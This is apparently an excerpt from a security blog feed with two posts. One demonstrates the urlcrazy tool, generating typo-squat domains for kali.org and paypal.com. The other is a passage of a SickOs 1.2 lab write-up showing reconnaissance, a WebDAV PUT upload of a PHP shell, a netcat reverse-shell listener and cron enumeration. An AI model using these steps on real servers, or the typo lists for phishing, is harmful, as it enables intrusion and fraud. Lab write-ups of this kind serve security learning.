    <content type="html"><![CDATA[<p><strong>Objective</strong> you want to detect possible URL hijacking or phishing of a domain, where unsuspecting users are lured to a malicious domain that is very similar to the original one. urlcrazy ftw!</p>

<p>Homepage: <a href="https://www.morningstarsecurity.com/research/urlcrazy">https://www.morningstarsecurity.com/research/urlcrazy</a></p>

<!-- more -->


<p></p>

<h2>urlcrazy description</h2>

<blockquote><p>Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking,
phishing, and corporate espionage.</p>

<p>Usage</p>

<p>Detect typo squatters profiting from typos on your domain name</p>

<p>Protect your brand by registering popular typos</p>

<p>Identify typo domain names that will receive traffic intended for another domain</p>

<p>Conduct phishing attacks during a penetration test</p>

<p>Features</p>

<p>Generates 15 types of domain variants</p>

<p>Knows over 8000 common misspellings</p>

<p>Supports cosmic ray induced bit flipping</p>

<p>Multiple keyboard layouts (qwerty, azerty, qwertz, dvorak)</p>

<p>Checks if a domain variant is valid</p>

<p>Test if domain variants are in use</p>

<p>Estimate popularity of a domain variant URLCrazy requires Linux and the Ruby interpreter.</p></blockquote>

<h2>urlcrazy options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>urlcrazy -h
</span><span class='line'>URLCrazy version 0.5
</span><span class='line'>by Andrew Horton (urbanadventurer)
</span><span class='line'>http://www.morningstarsecurity.com/research/urlcrazy
</span><span class='line'>
</span><span class='line'>Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking,
</span><span class='line'>phishing, and corporate espionage.
</span><span class='line'>
</span><span class='line'>Supports the following domain variations:
</span><span class='line'>Character omission, character repeat, adjacent character swap, adjacent character replacement, double
</span><span class='line'>character replacement, adjacent character insertion, missing dot, strip dashes, singular or pluralise,
</span><span class='line'>common misspellings, vowel swaps, homophones, bit flipping (cosmic rays), homoglyphs, wrong top level
</span><span class='line'>domain, and wrong second level domain.
</span><span class='line'>
</span><span class='line'>Usage: /usr/bin/urlcrazy [options] domain
</span><span class='line'>
</span><span class='line'>Options
</span><span class='line'> -k, --keyboard=LAYOUT    Options are: qwerty, azerty, qwertz, dvorak (default: qwerty)
</span><span class='line'> -p, --popularity Check domain popularity with Google
</span><span class='line'> -r, --no-resolve Do not resolve DNS
</span><span class='line'> -i, --show-invalid   Show invalid domain names
</span><span class='line'> -f, --format=TYPE    Human readable or CSV (default: human readable)
</span><span class='line'> -o, --output=FILE    Output file
</span><span class='line'> -h, --help       This help
</span><span class='line'> -v, --version    Print version information. This version is 0.5</span></code></pre></td></tr></table></div></figure>


<h2>urlcrazy usage</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>urlcrazy kali.org
</span><span class='line'>/usr/share/urlcrazy/tld.rb:81: warning: key "2nd_level_registration" is duplicated and overwritten on line 81
</span><span class='line'>/usr/share/urlcrazy/tld.rb:89: warning: key "2nd_level_registration" is duplicated and overwritten on line 89
</span><span class='line'>/usr/share/urlcrazy/tld.rb:91: warning: key "2nd_level_registration" is duplicated and overwritten on line 91
</span><span class='line'>URLCrazy Domain Report
</span><span class='line'>Domain    : kali.org
</span><span class='line'>Keyboard  : qwerty
</span><span class='line'>At        : 2017-07-05 06:57:50 -0400
</span><span class='line'>
</span><span class='line'># Please wait. 63 hostnames to process
</span><span class='line'>
</span><span class='line'>Typo Type              Typo         DNS-A            CC-A               DNS-MX                                Extn  
</span><span class='line'>--------------------------------------------------------------------------------------------------------------------
</span><span class='line'>Character Omission     kai.org      111.89.129.15    JP,JAPAN           kai.org                               org   
</span><span class='line'>Character Omission     kal.org      69.172.201.153   US,UNITED STATES                                         org   
</span><span class='line'>Character Omission     kli.org      208.97.188.67    US,UNITED STATES   vade-in2.mail.dreamhost.com           org   
</span><span class='line'>Character Repeat       kaali.org    184.168.221.56   US,UNITED STATES   mailstore1.secureserver.net           org   
</span><span class='line'>Character Repeat       kalii.org                     ?                                                        org   
</span><span class='line'>Character Repeat       kalli.org                     ?                  mail.joker.com                        org   
</span><span class='line'>Character Repeat       kkali.org                     ?                                                        org   
</span><span class='line'>Character Swap         akli.org     180.240.134.81   SG,SINGAPORE       mail.akli.org                         org   
</span><span class='line'>Character Swap         kail.org     185.53.178.9                        mail.h-email.net                      org   
</span><span class='line'>Character Swap         klai.org     74.208.59.167    US,UNITED STATES   mx01.1and1.com                        org   
</span><span class='line'>Character Replacement  jali.org                      ?                  mailin1.totalweb.net.uk               org   
</span><span class='line'>Character Replacement  kaki.org                      ?                                                        org   
</span><span class='line'>Character Replacement  kalo.org     54.214.44.86     US,UNITED STATES   aspmx5.googlemail.com                 org   
</span><span class='line'>Character Replacement  kalu.org     64.85.171.16     US,UNITED STATES   host.rack-host.net                    org   
</span><span class='line'>Character Replacement  ksli.org     203.184.176.168  HK,HONG KONG                                             org   
</span><span class='line'>Character Replacement  lali.org     194.232.43.3     AT,AUSTRIA         dedi3762.your-server.de               org   
</span><span class='line'>Character Insertion    kalio.org    213.186.33.87    FR,FRANCE          mx2.ovh.net                           org   
</span><span class='line'>Character Insertion    kaliu.org    67.205.40.20     US,UNITED STATES   vade-in1.mail.dreamhost.com           org   
</span><span class='line'>Character Insertion    kalki.org    97.74.42.79      US,UNITED STATES   smtp.secureserver.net                 org   
</span><span class='line'>Character Insertion    kasli.org    217.112.35.116   GB,UNITED KINGDOM  mx25.valuehost.ru                     org   
</span><span class='line'>Character Insertion    kjali.org                     ?                                                        org   
</span><span class='line'>Character Insertion    klali.org                     ?                                                        org   
</span><span class='line'>Missing Dot            kaliorg.com                   ?                                                        com   
</span><span class='line'>Missing Dot            wwwkali.org                   ?                                                        org   
</span><span class='line'>Singular or Pluralise  kalis.org    217.160.233.111  DE,GERMANY         mx00.kundenserver.de                  org   
</span><span class='line'>Vowel Swap             kala.org     64.111.125.111   US,UNITED STATES   ASPMX2.GOOGLEMAIL.COM                 org   
</span><span class='line'>Vowel Swap             kale.org     185.53.178.9                        mail.h-email.net                      org   
</span><span class='line'>Vowel Swap             keli.org                      ?                  mail.hti.ag                           org   
</span><span class='line'>Vowel Swap             kili.org     69.172.201.153   US,UNITED STATES                                         org   
</span><span class='line'>Vowel Swap             koli.org     72.52.4.122      US,UNITED STATES   localhost                             org   
</span><span class='line'>Vowel Swap             kuli.org     37.120.172.191   JP,JAPAN           v2.v1.biz                             org   
</span><span class='line'>Homophones             kalaye.org                    ?                                                        org   
</span><span class='line'>Homophones             kaleye.org                    ?                                                        org   
</span><span class='line'>Bit Flipping           cali.org     23.21.169.243    US,UNITED STATES   alt1.aspmx.l.google.com               org   
</span><span class='line'>Bit Flipping           iali.org                      ?                                                        org   
</span><span class='line'>Bit Flipping           kadi.org     146.148.34.125   US,UNITED STATES   mail.hope-mail.com                    org   
</span><span class='line'>Bit Flipping           kahi.org     206.126.4.4      պ,                kahi-org.mail.protection.outlook.com  org   
</span><span class='line'>Bit Flipping           kalh.org     50.63.33.1       E�,                mailstore1.secureserver.net           org   
</span><span class='line'>Bit Flipping           kalk.org     137.74.127.233                                                            org   
</span><span class='line'>Bit Flipping           kalm.org                      ?                  mx.kalm.org.cust.a.hostedemail.com    org   
</span><span class='line'>Bit Flipping           kaly.org     207.148.248.143  US,UNITED STATES                                         org   
</span><span class='line'>Bit Flipping           kami.org     69.172.201.153   ��,                                                      org   
</span><span class='line'>Bit Flipping           kani.org     178.33.20.67     FR,FRANCE          mail.kani.org                         org   
</span><span class='line'>Bit Flipping           kcli.org     50.63.202.44     US,UNITED STATES   ALT1.ASPMX.L.GOOGLE.COM               org   
</span><span class='line'>Bit Flipping           kqli.org                      ?                                                        org   
</span><span class='line'>Bit Flipping           oali.org     184.107.215.202  CA,CANADA          oali.org                              org   
</span><span class='line'>Homoglyphs             ka1i.org                      ?                                                        org   
</span><span class='line'>Homoglyphs             kall.org     65.254.238.128   US,UNITED STATES   mx.kall.org                           org   
</span><span class='line'>Wrong TLD              kali.ca      76.74.246.51     US,UNITED STATES   kali.ca                               ca    
</span><span class='line'>Wrong TLD              kali.ch      81.221.254.5     CH,SWITZERLAND     kali.ch.2.arsmtp.com                  ch    
</span><span class='line'>Wrong TLD              kali.com     75.164.208.82    US,UNITED STATES   alt2.aspmx.l.google.com               com   
</span><span class='line'>Wrong TLD              kali.de      193.238.9.165    DE,GERMANY                                               de    
</span><span class='line'>Wrong TLD              kali.edu                      ?                                                        edu   
</span><span class='line'>Wrong TLD              kali.es      212.227.247.181  DE,GERMANY         mx01.1and1.es                         es    
</span><span class='line'>Wrong TLD              kali.fr      103.224.182.248                     mx92.mb5p.com                         fr    
</span><span class='line'>Wrong TLD              kali.it      195.110.124.188  IT,ITALY           mail.register.it                      it    
</span><span class='line'>Wrong TLD              kali.jp      8.6.19.68        US,UNITED STATES   smtp.secureserver.net                 jp    
</span><span class='line'>Wrong TLD              kali.net     45.40.165.16                        ASPMX.L.GOOGLE.COM                    net   
</span><span class='line'>Wrong TLD              kali.nl      72.52.4.121      US,UNITED STATES   localhost                             nl    
</span><span class='line'>Wrong TLD              kali.no      194.63.248.52    NO,NORWAY          mx02.domeneshop.no                    no    
</span><span class='line'>Wrong TLD              kali.ru      185.53.179.40                                                             ru    
</span><span class='line'>Wrong TLD              kali.se      92.42.73.20      SE,SWEDEN          kali-se.mail.protection.outlook.com   se    
</span><span class='line'>Wrong TLD              kali.us      184.168.221.28   US,UNITED STATES   209.150.186.51                        us   </span></code></pre></td></tr></table></div></figure>


<ul>
<li>check domain popularity with no DNS resolution</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>urlcrazy -p -r paypal.com
</span><span class='line'>/usr/share/urlcrazy/tld.rb:81: warning: key "2nd_level_registration" is duplicated and overwritten on line 81
</span><span class='line'>/usr/share/urlcrazy/tld.rb:89: warning: key "2nd_level_registration" is duplicated and overwritten on line 89
</span><span class='line'>/usr/share/urlcrazy/tld.rb:91: warning: key "2nd_level_registration" is duplicated and overwritten on line 91
</span><span class='line'>URLCrazy Domain Report
</span><span class='line'>Domain    : paypal.com
</span><span class='line'>Keyboard  : qwerty
</span><span class='line'>At        : 2017-07-05 07:01:52 -0400
</span><span class='line'>
</span><span class='line'># Please wait. 80 hostnames to process
</span><span class='line'>
</span><span class='line'>Typo Type              Typo           Pop  CC-A  Extn  
</span><span class='line'>-------------------------------------------------------
</span><span class='line'>Character Omission     papal.com           ?     com   
</span><span class='line'>Character Omission     payal.com           ?     com   
</span><span class='line'>Character Omission     paypa.com           ?     com   
</span><span class='line'>Character Omission     paypal.cm           ?     cm    
</span><span class='line'>Character Omission     paypl.com           ?     com   
</span><span class='line'>Character Omission     pypal.com           ?     com   
</span><span class='line'>Character Repeat       paaypal.com         ?     com   
</span><span class='line'>Character Repeat       paypaal.com         ?     com   
</span><span class='line'>Character Repeat       paypall.com         ?     com   
</span><span class='line'>Character Repeat       payppal.com         ?     com   
</span><span class='line'>Character Repeat       payypal.com         ?     com   
</span><span class='line'>Character Repeat       ppaypal.com         ?     com   
</span><span class='line'>Character Swap         apypal.com          ?     com   
</span><span class='line'>Character Swap         papyal.com          ?     com   
</span><span class='line'>Character Swap         payapl.com          ?     com   
</span><span class='line'>Character Swap         paypla.com          ?     com   
</span><span class='line'>Character Swap         pyapal.com          ?     com   
</span><span class='line'>Character Replacement  oaypal.com          ?     com   
</span><span class='line'>Character Replacement  patpal.com          ?     com   
</span><span class='line'>Character Replacement  paupal.com          ?     com   
</span><span class='line'>Character Replacement  payoal.com          ?     com   
</span><span class='line'>Character Replacement  paypak.com          ?     com   
</span><span class='line'>Character Replacement  paypsl.com          ?     com   
</span><span class='line'>Character Replacement  psypal.com          ?     com   
</span><span class='line'>Character Insertion    pasypal.com         ?     com   
</span><span class='line'>Character Insertion    paypalk.com         ?     com   
</span><span class='line'>Character Insertion    paypasl.com         ?     com   
</span><span class='line'>Character Insertion    paypoal.com         ?     com   
</span><span class='line'>Character Insertion    paytpal.com         ?     com   
</span><span class='line'>Character Insertion    payupal.com         ?     com   
</span><span class='line'>Character Insertion    poaypal.com         ?     com   
</span><span class='line'>Missing Dot            paypalcom.com       ?     com   
</span><span class='line'>Missing Dot            wwwpaypal.com       ?     com   
</span><span class='line'>Singular or Pluralise  paypals.com         ?     com   
</span><span class='line'>Vowel Swap             peypel.com          ?     com   
</span><span class='line'>Vowel Swap             piypil.com          ?     com   
</span><span class='line'>Vowel Swap             poypol.com          ?     com   
</span><span class='line'>Vowel Swap             puypul.com          ?     com   
</span><span class='line'>Bit Flipping           0aypal.com          ?     com   
</span><span class='line'>Bit Flipping           pa9pal.com          ?     com   
</span><span class='line'>Bit Flipping           paipal.com          ?     com   
</span><span class='line'>Bit Flipping           paqpal.com          ?     com   
</span><span class='line'>Bit Flipping           paxpal.com          ?     com   
</span><span class='line'>Bit Flipping           pay0al.com          ?     com   
</span><span class='line'>Bit Flipping           paypad.com          ?     com   
</span><span class='line'>Bit Flipping           paypah.com          ?     com   
</span><span class='line'>Bit Flipping           paypam.com          ?     com   
</span><span class='line'>Bit Flipping           paypan.com          ?     com   
</span><span class='line'>Bit Flipping           paypcl.com          ?     com   
</span><span class='line'>Bit Flipping           paypel.com          ?     com   
</span><span class='line'>Bit Flipping           paypil.com          ?     com   
</span><span class='line'>Bit Flipping           paypql.com          ?     com   
</span><span class='line'>Bit Flipping           payqal.com          ?     com   
</span><span class='line'>Bit Flipping           payral.com          ?     com   
</span><span class='line'>Bit Flipping           paytal.com          ?     com   
</span><span class='line'>Bit Flipping           payxal.com          ?     com   
</span><span class='line'>Bit Flipping           pcypal.com          ?     com   
</span><span class='line'>Bit Flipping           peypal.com          ?     com   
</span><span class='line'>Bit Flipping           piypal.com          ?     com   
</span><span class='line'>Bit Flipping           pqypal.com          ?     com   
</span><span class='line'>Bit Flipping           qaypal.com          ?     com   
</span><span class='line'>Bit Flipping           raypal.com          ?     com   
</span><span class='line'>Bit Flipping           taypal.com          ?     com   
</span><span class='line'>Bit Flipping           xaypal.com          ?     com   
</span><span class='line'>Homoglyphs             paypa1.com          ?     com   
</span><span class='line'>Wrong TLD              paypal.ca           ?     ca    
</span><span class='line'>Wrong TLD              paypal.ch           ?     ch    
</span><span class='line'>Wrong TLD              paypal.de           ?     de    
</span><span class='line'>Wrong TLD              paypal.edu          ?     edu   
</span><span class='line'>Wrong TLD              paypal.es           ?     es    
</span><span class='line'>Wrong TLD              paypal.fr           ?     fr    
</span><span class='line'>Wrong TLD              paypal.it           ?     it    
</span><span class='line'>Wrong TLD              paypal.jp           ?     jp    
</span><span class='line'>Wrong TLD              paypal.net          ?     net   
</span><span class='line'>Wrong TLD              paypal.nl           ?     nl    
</span><span class='line'>Wrong TLD              paypal.no           ?     no    
</span><span class='line'>Wrong TLD              paypal.org          ?     org   
</span><span class='line'>Wrong TLD              paypal.ru           ?     ru    
</span><span class='line'>Wrong TLD              paypal.se           ?     se    
</span><span class='line'>Wrong TLD              paypal.us           ?     us    </span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Everything that you know is wrong, but \
</span><span class='line'>\ you can be straightened out.           /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SickOs 1.2 writeup]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup/"/>
    <updated>2017-07-03T04:20:13-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/03/sickos-1-dot-2-writeup</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is the second machine in the SickOs series. The goal is to obtain the root flag. Target acquired!</p>

<!-- more -->


<p></p>

<p>I did a fast scan with Masscan and discovered that ports 22 and 80 are open. Then I scanned them with Nmap:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -p22,80 -sV 192.168.217.146
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-03 09:11 EDT
</span><span class='line'>Nmap scan report for 192.168.217.146
</span><span class='line'>Host is up (0.00030s latency).
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>80/tcp open  http    lighttpd 1.4.28</span></code></pre></td></tr></table></div></figure>


<p>The web server serves this pic:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/2-blow.jpg" title="web server" alt="webpage"></p>

<p>Nothing in exiftool. I bruteforced the web server, but the only discovery was an empty test directory. I initially overlooked the page source of the picture, until I noticed there is a scroll bar. So I scrolled down to find a comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- NOTHING IN HERE ///\\\ --&gt;&gt;&gt;&gt;</span></code></pre></td></tr></table></div></figure>


<p>I tried constructing a path out of the comment, but didn&rsquo;t get anywhere. Searching for an exploit for the lighttpd server version didn&rsquo;t yield anything either, although I found some for other versions.</p>

<p>Back to the empty directory, I found it strange that there would be an innocuous empty folder on the web server, and I thought it might hint to making it..not empty by uploading something there :&ndash;) I was at a loss on how to do that with no attack vectors, but then I remembered that uploading something on a server doesn&rsquo;t always require sophisticated mechanisms and PHP vulnerabilities and the like. It&rsquo;s just as simple as using a certain HTTP method that you don&rsquo;t see too often: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT">PUT</a></p>

<p>First, I needed to verify if PUT is allowed in the first place:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.217.146
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>| http-methods: 
</span><span class='line'>|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
</span><span class='line'>|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
</span><span class='line'>|_  Path tested: /test</span></code></pre></td></tr></table></div></figure>


<p>Excellent! I proceeded to upload a PHP shell with curl,but I got some weird expectation failed errors. Luckily, Nmap also has a script for PUT&#8217;ing things on a server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 80 192.168.217.146 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='/root/Desktop/shell.php'
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-04 04:36 EDT
</span><span class='line'>Nmap scan report for 192.168.217.146
</span><span class='line'>Host is up (0.00031s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>|_http-put: /test/shell.php was successfully created</span></code></pre></td></tr></table></div></figure>


<p>All didn&rsquo;t work well, though. I usually use 8888 for my reverse shells, but this time I got nothing. I tried port 80, and still no joy. It seems that only port 443 is allowed. I looked at other walkthroughs for this, so I&rsquo;m not sure how you could determine it otherwise besides trial and error. But when I changed to the correct port, I got the shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 443
</span><span class='line'>listening on [any] 443 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.146] 49769
</span><span class='line'>Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
</span><span class='line'> 01:48:24 up  1:38,  0 users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ whoami
</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>


<p>Next, I did some enumeration. The usual culprits didn&rsquo;t stand out, and the permissions on this shell were pretty limited, but I did find something interesting pertaining to cron:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls -al /etc/cron*
</span><span class='line'>-rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab
</span><span class='line'>
</span><span class='line'>ls: cannot open directory /etc/cron.d: Permission denied
</span><span class='line'>/etc/cron.daily:
</span><span class='line'>total 72
</span><span class='line'>drwxr-xr-x  2 root root  4096 Apr 12  2016 .
</span><span class='line'>drwxr-xr-x 84 root root  4096 Jul  4 00:10 ..
</span><span class='line'>-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
</span><span class='line'>-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
</span><span class='line'>-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
</span><span class='line'>-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
</span><span class='line'>-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
</span><span class='line'>-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
</span><span class='line'>-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
</span><span class='line'>-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
</span><span class='line'>-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
</span><span class='line'>-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
</span><span class='line'>-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
</span><span class='line'>-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
</span><span class='line'>-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard</span></code></pre></td></tr></table></div></figure>


